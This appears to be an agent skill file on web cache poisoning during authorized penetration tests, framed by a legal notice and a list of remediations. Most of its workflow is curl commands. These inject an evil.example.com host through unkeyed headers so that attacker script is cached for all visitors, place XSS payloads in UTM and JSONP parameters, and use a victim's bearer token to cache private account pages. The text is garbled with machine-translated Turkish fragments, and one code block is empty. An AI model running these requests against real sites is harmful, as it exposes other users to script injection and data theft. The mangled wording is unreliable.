---
name: performing-web-cache-poisoning-attack
description: Exploiting web cache mechanisms to serve malicious content to other users by poisoning cached responses through unkeyed headers and parameters during authorized security tests.
tags:
- cache-poisoning
- web-security
- owasp
- cdn
- fetih
- web-application-security
- burpsuite
- cybersecurity
- penetration-testing
- siber-güvenlik
triggers:
- CSRF
- SQL injection
- XSS
- alert
- api
- attack
- cache
- cloud
- dns
- email
- exploit
- http
category: web-application-security
source_subdomain: web-application-security
nist_csf:
- PR.PS-01
- ID.RA-01
- PR.DS-10
- DE.CM-01
---

# Performing Web Cache Poisoning Attack


## Ne Zaman Kullanılır

- During authorized penetration tests when the application uses CDN or reverse proxy caching (Cloudflare, Akamai, Varnish, Nginx)
- assessing yaparken web applications for cache-based vulnerabilities that could affect all users
- For testing whether unkeyed HTTP headers are reflected in cached responses
- evaluating yaparken: cache key behavior and cache deception vulnerabilities
- During security assessments of applications with aggressive caching policies

## Ön Gereksinimler

- **Authorization**: Written penetration testing agreement explicitly covering cache poisoning testing
- **Burp Suite Professional**: With Param Miner extension for automated unkeyed header discovery
- **curl**: For manual cache testing with precise header control
- **Target knowledge**: Understanding of the caching layer (CDN provider, cache headers)
- **Cache buster**: Unique query parameter to isolate test requests from other users
- **Caution**: Cache poisoning affects all users; test with cache-busting parameters first


> **Legal Notice:** bu skill is for authorized security testing and educational purposes only. Unauthorized use against systems you do not own or have written permission to test is illegal and may violate computer fraud laws.

## İş Akışı

### Adım 1: the tespit et: Caching Layer and Behavior

Belirle: what caching infrastructure is in use and how the cache key is constructed.

```bash
curl -s -I "https://target.example.com/" | grep -iE \
  "(cache-control|x-cache|cf-cache|age|vary|x-varnish|x-served-by|cdn|via)"


curl -s -I "https://target.example.com/page?cachebuster=test1" | grep -i "x-cache"
curl -s -I "https://target.example.com/page?cachebuster=test1" | grep -i "x-cache"

curl -s -I "https://target.example.com/" | grep -i "vary"
```

### Adım 2: Discover Unkeyed Inputs with Param Miner

Use Burp's Param Miner to Bul: headers and parameters not included in the cache key but reflected in responses.

```

```

```bash
CB="cachebuster=$(date +%s)"

curl -s -H "X-Forwarded-Host: evil.example.com" \
  "https://target.example.com/?$CB" | grep "evil.example.com"

curl -s -H "X-Forwarded-Scheme: nothttps" \
  "https://target.example.com/?$CB" | grep "nothttps"

curl -s -H "X-Original-URL: /admin" \
  "https://target.example.com/?$CB"

curl -s -H "X-Forwarded-Proto: http" \
  "https://target.example.com/?$CB" | grep "http://"
```

### Adım 3: Exploit Unkeyed Header for Cache Poisoning

Craft requests that poison cached responses with malicious content.

```bash

curl -s -H "X-Forwarded-Host: evil.example.com" \
  "https://target.example.com/?cb=unique123" | \
  grep "evil.example.com"

curl -s -H "X-Forwarded-Host: evil.example.com" \
  "https://target.example.com/"

curl -s "https://target.example.com/" | grep "evil.example.com"

curl -s -H "X-Forwarded-Proto: http" \
  "https://target.example.com/?cb=unique456"

curl -s \
  -H "X-Forwarded-Host: evil.example.com" \
  -H "X-Forwarded-Proto: https" \
  "https://target.example.com/?cb=unique789"
```

### Adım 4: Test Web Cache Deception

Trick the cache into storing authenticated responses for public URLs.

```bash


curl -s -H "Authorization: Bearer $VICTIM_TOKEN" \
  "https://target.example.com/account/profile/test.css" | \
  grep -i "email\|name\|balance"

curl -s "https://target.example.com/account/profile/test.css"

for ext in css js jpg png gif ico svg woff woff2 ttf; do
  echo -n ".$ext: "
  curl -s -H "Authorization: Bearer $TOKEN" \
    -o /dev/null -w "%{http_code} %{size_download}" \
    "https://target.example.com/account/settings/x.$ext"
  echo
done

```

### Adım 5: Test Parameter-Based Cache Poisoning

Exploit unkeyed query parameters or parameter parsing differences.

```bash
curl -s "https://target.example.com/?utm_content=<script>alert(1)</script>&cb=$(date +%s)" | \
  grep "alert"

curl -s "https://target.example.com/jsonp?callback=alert(1)&cb=$(date +%s)"

curl -s -X GET \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "param=evil_value" \
  "https://target.example.com/page?cb=$(date +%s)"

curl -s "https://target.example.com/page?a=1&b=2" # Cached as key1
curl -s "https://target.example.com/page?b=2&a=1" # Same key? Or different?

curl -s -H "Host: target.example.com:1234" \
  "https://target.example.com/?cb=$(date +%s)" | grep "1234"
```

### Adım 6: Validate Impact and Clean Up

Confirm the attack impact and ensure poisoned cache entries are cleared.

```bash
curl -s -H "User-Agent: CacheVerification" \
  "https://target.example.com/" | grep "evil"

curl -s -I "https://target.example.com/" | grep -i "cache-control\|max-age\|s-maxage"

curl -s -X PURGE "https://target.example.com/"

```

## Key Concepts

| Concept | Description |
|---------|-------------|
| **Cache Key** | The set of request attributes (host, path, query) used to identify cached responses |
| **Unkeyed Input** | HTTP headers or parameters not included in the cache key but reflected in responses |
| **Cache Poisoning** | Injecting malicious content into cached responses that are served to other users |
| **Cache Deception** | Tricking the cache into storing authenticated/private responses as public content |
| **Vary Header** | HTTP header specifying which request headers should be included in the cache key |
| **Cache Buster** | A unique query parameter used to prevent affecting the real cache during testing |
| **TTL (Time to Live)** | Duration a cached response remains valid before being refreshed |

## Tools & Systems

| Tool | Purpose |
|------|---------|
| **Burp Suite Professional** | Request interception and cache behavior analysis |
| **Param Miner (Burp Extension)** | Automated discovery of unkeyed HTTP headers and parameters |
| **Web Cache Vulnerability Scanner** | Automated cache poisoning Tespit tool |
| **curl** | Manual HTTP request crafting with precise header control |
| **Varnishlog** | Varnish cache debugging and log analysis |
| **CDN-specific tools** | Cloudflare Analytics, Akamai Pragma headers for cache diagnostics |

## Common Scenarios

### Scenario 1: X-Forwarded-Host Script Injection
The application reflects the `X-Forwarded-Host` header in script src URLs. This header is not part of the cache key. Sending a request with `X-Forwarded-Host: evil.com` poisons the cache to load JavaScript from the attacker's server for all subsequent visitors.

### Scenario 2: Web Cache Deception on Account Page
A Cloudflare-cached application ignores unknown path segments. Requesting `/account/profile/logo.png` returns the account page while Cloudflare caches it as a static image. Any unauthenticated user can then access the cached account page.

### Scenario 3: Parameter-Based XSS via Cache
UTM tracking parameters are excluded from the cache key but rendered in the page HTML. Injecting `<script>` tags via `utm_content` parameter poisons the cache with stored XSS affecting all visitors.

### Scenario 4: CDN Cache Poisoning via Host Header
Multiple applications are behind the same CDN. Manipulating the Host header causes the CDN to cache a response from one application under another application's cache key.

## Output Format

```
## Web Cache Poisoning Bul:ing

**Vulnerability**: Web Cache Poisoning via Unkeyed Header
**Severity**: High (CVSS 8.6)
**Location**: X-Forwarded-Host header on all pages
**OWASP Category**: A05:2021 - Security Misconfiguration

### Cache Configuration
| Property | Value |
|----------|-------|
| CDN/Cache | Cloudflare |
| Cache-Control | max-age=3600, public |
| Unkeyed Headers | X-Forwarded-Host, X-Forwarded-Proto |
| Affected Pages | All HTML pages (/*.html) |

### Reproduction Steps
1. Send request with X-Forwarded-Host: evil.example.com
2. Response includes: <link href="https://evil.example.com/style.css">
3. This response is cached by Cloudflare for 3600 seconds
4. All subsequent visitors receive the poisoned response

### Impact
- JavaScript execution in all users' browsers (via poisoned script src)
- Credential theft, session hijacking, defacement
- Affects estimated 50,000 daily visitors during 1-hour cache window
- Can be re-poisoned continuously for persistent attack

### Recommendation
1. Include X-Forwarded-Host and similar headers in the cache key via Vary header
2. Do not reflect unkeyed headers in response content
3. Şunu yapılandır: cache to strip unknown headers before forwarding to origin
4. Use application-level hardcoded base URLs instead of deriving from headers
5. Implement cache key normalization to prevent key manipulation
```
